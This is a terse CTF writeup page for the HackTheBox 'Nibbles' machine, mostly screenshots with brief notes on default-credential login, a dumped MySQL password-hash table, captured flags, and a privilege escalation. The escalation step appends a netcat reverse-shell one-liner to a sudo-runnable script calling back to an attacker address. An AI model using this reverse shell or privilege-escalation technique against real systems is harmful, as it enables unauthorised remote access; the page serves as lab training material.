@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="dark">
+<title>Nibbles · the-grizzly-bear</title>
+<meta name="description" content="Nibbles — Cybersecurity Notes &amp; CTF Writeups">
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127988;</text></svg>">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776;</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="../../index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>the-grizzly-bear</strong><small>Cybersecurity Notes &amp; CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/completed-machines/nibbles.html" data-root="../.."></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="../../index.html">the-grizzly-bear</a> &rsaquo; <a href="../index.html">HackTheBox</a> &rsaquo; <a href="index.html">Completed Machines</a></div>
+<h1 id="title">Nibbles</h1>
+<nav class="toc"><strong>On this page</strong><ul><li class="lvl1"><a href="#disable-directory-browsing">Disable directory browsing</a></li><li class="lvl1"><a href="#disable-magic-quotes">Disable Magic Quotes</a></li><li class="lvl1"><a href="#secure-xml-files">Secure .xml files</a></li><li class="lvl1"><a href="#secure-shadowphp">Secure shadow.php</a></li><li class="lvl1"><a href="#secure-keysphp">Secure keys.php</a></li></ul></nav>
+<p class="figure"><a class="img-link" href="nibbles/untitled.png"><img src="nibbles/untitled.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-1.png"><img src="nibbles/untitled-1.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-2.png"><img src="nibbles/untitled-2.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-3.png"><img src="nibbles/untitled-3.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-4.png"><img src="nibbles/untitled-4.png" alt="Untitled" loading="lazy"></a></p>
+<p><a href="http://10.129.221.96/nibbleblog/index.php?controller=blog&amp;amp;action=view&amp;amp;category=uncategorised" target="_blank" rel="noopener">http://10.129.221.96/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised</a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-5.png"><img src="nibbles/untitled-5.png" alt="Untitled" loading="lazy"></a></p>
+<p>Apache/2.4.18 (Ubuntu)</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-6.png"><img src="nibbles/untitled-6.png" alt="Untitled" loading="lazy"></a></p>
+<p>JuicyBOOK</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-7.png"><img src="nibbles/untitled-7.png" alt="Untitled" loading="lazy"></a></p>
+<p>shadow</p>
+<p>keys</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-8.png"><img src="nibbles/untitled-8.png" alt="Untitled" loading="lazy"></a></p>
+<p>pivot to 10.10.10.134?</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-9.png"><img src="nibbles/untitled-9.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-10.png"><img src="nibbles/untitled-10.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-11.png"><img src="nibbles/untitled-11.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-12.png"><img src="nibbles/untitled-12.png" alt="Untitled" loading="lazy"></a></p>
+<p>test with</p>
+<p>admin</p>
+<p>nibbles</p>
+<p>it works!</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-13.png"><img src="nibbles/untitled-13.png" alt="Untitled" loading="lazy"></a></p>
+<p>79378f814ff584702cc6ded1950bcd7dd4d4562d</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-14.png"><img src="nibbles/untitled-14.png" alt="Untitled" loading="lazy"></a></p>
+<h1 id="disable-directory-browsing">Disable directory browsing</h1>
+<p>Options -Indexes</p>
+<h1 id="disable-magic-quotes">Disable Magic Quotes</h1>
+<p>&lt;IfModule mod_php5.c&gt;<br>
+php_flag magic_quotes_gpc off<br>
+&lt;/IfModule&gt;</p>
+<h1 id="secure-xml-files">Secure .xml files</h1>
+<p>&lt;FilesMatch ".(xml)$"&gt;<br>
+Order Allow,Deny<br>
+Deny from all<br>
+&lt;/FilesMatch&gt;</p>
+<h1 id="secure-shadowphp">Secure shadow.php</h1>
+<p>&lt;Files shadow.php&gt;<br>
+order allow,deny<br>
+deny from all<br>
+&lt;/Files&gt;</p>
+<h1 id="secure-keysphp">Secure keys.php</h1>
+<p>&lt;Files keys.php&gt;<br>
+order allow,deny<br>
+deny from all<br>
+&lt;/Files&gt;</p>
+<p>ErrorDocument 404 /nibbleblog/index.php?controller=page&amp;action=404</p>
+<p>&lt;IfModule mod_rewrite.c&gt;<br>
+RewriteEngine on<br>
+RewriteBase /nibbleblog/</p>
+<p>RewriteRule ^category/([^/]+)/page-([0-9]+)$ index.php?controller=blog&amp;action=view&amp;category=$1&amp;number=$2 [L]<br>
+RewriteRule ^category/([^/]+)/$ index.php?controller=blog&amp;action=view&amp;category=$1&amp;number=0 [L]<br>
+RewriteRule ^tag/([^/]+)/page-([0-9]+)$ index.php?controller=blog&amp;action=view&amp;tag=$1&amp;number=$2 [L]<br>
+RewriteRule ^tag/([^/]+)/$ index.php?controller=blog&amp;action=view&amp;tag=$1&amp;number=0 [L]<br>
+RewriteRule ^page-([0-9]+)$ index.php?controller=blog&amp;action=view&amp;number=$1 [L]<br>
+RewriteRule ^post/([^/]+)/$ index.php?controller=post&amp;action=view&amp;post=$1 [L]<br>
+RewriteRule ^post-([0-9]+)/(.*)$ index.php?controller=post&amp;action=view&amp;id_post=$1 [L]<br>
+RewriteRule ^page/([^/]+)/$ index.php?controller=page&amp;action=view&amp;page=$1 [L]<br>
+RewriteRule ^feed/$ feed.php [L]<br>
+RewriteRule ^([^/]+)/$ index.php?controller=page&amp;action=$1 [L]<br>
+&lt;/IfModule&gt;</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-15.png"><img src="nibbles/untitled-15.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-16.png"><img src="nibbles/untitled-16.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-17.png"><img src="nibbles/untitled-17.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-18.png"><img src="nibbles/untitled-18.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-19.png"><img src="nibbles/untitled-19.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-20.png"><img src="nibbles/untitled-20.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-21.png"><img src="nibbles/untitled-21.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-22.png"><img src="nibbles/untitled-22.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-23.png"><img src="nibbles/untitled-23.png" alt="Untitled" loading="lazy"></a></p>
+<p>upgrade shell</p>
+<p>python3 -c 'import pty;pty.spawn("/bin/bash")’</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-24.png"><img src="nibbles/untitled-24.png" alt="Untitled" loading="lazy"></a></p>
+<p>user own</p>
+<p>629a9c01b7211d8287a97e314e1314b4</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-25.png"><img src="nibbles/untitled-25.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-26.png"><img src="nibbles/untitled-26.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-27.png"><img src="nibbles/untitled-27.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-28.png"><img src="nibbles/untitled-28.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-29.png"><img src="nibbles/untitled-29.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-30.png"><img src="nibbles/untitled-30.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-31.png"><img src="nibbles/untitled-31.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-32.png"><img src="nibbles/untitled-32.png" alt="Untitled" loading="lazy"></a></p>
+<p>W</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-33.png"><img src="nibbles/untitled-33.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-34.png"><img src="nibbles/untitled-34.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-35.png"><img src="nibbles/untitled-35.png" alt="Untitled" loading="lazy"></a></p>
+<pre><code class="language-bash">User	Host	authentication_string
+root	localhost	*9CFBBC772F3F6C106020035386DA5BBBF1249A11
+mysql.session	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+mysql.sys	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
+debian-sys-maint	localhost	*0B46F5EC336AFB411DB534D6A50EA98C619B0DE4</code></pre>
+<p class="figure"><a class="img-link" href="nibbles/untitled-36.png"><img src="nibbles/untitled-36.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-37.png"><img src="nibbles/untitled-37.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-38.png"><img src="nibbles/untitled-38.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-39.png"><img src="nibbles/untitled-39.png" alt="Untitled" loading="lazy"></a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-40.png"><img src="nibbles/untitled-40.png" alt="Untitled" loading="lazy"></a></p>
+<p>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 8888 &gt; /tmp/f" &gt;&gt; <a href="http://monitor.sh/" target="_blank" rel="noopener">monitor.sh</a></p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-41.png"><img src="nibbles/untitled-41.png" alt="Untitled" loading="lazy"></a></p>
+<p>sudo /home/nibbler/personal/stuff/monitor.sh</p>
+<p class="figure"><a class="img-link" href="nibbles/untitled-42.png"><img src="nibbles/untitled-42.png" alt="Untitled" loading="lazy"></a></p>
+<p>root own</p>
+<p>59f84eb7e2bbdae3b8db000c274c5b47</p>
+<p>dde904d29b29ab51b8dbc2602cbcaa58</p>
+  </article>
+  <footer class="foot">Built from a Notion export · <a href="https://github.com/the-grizzly-bear">github.com/the-grizzly-bear</a></footer>
+</main>
+</div>
+<script src="../../assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
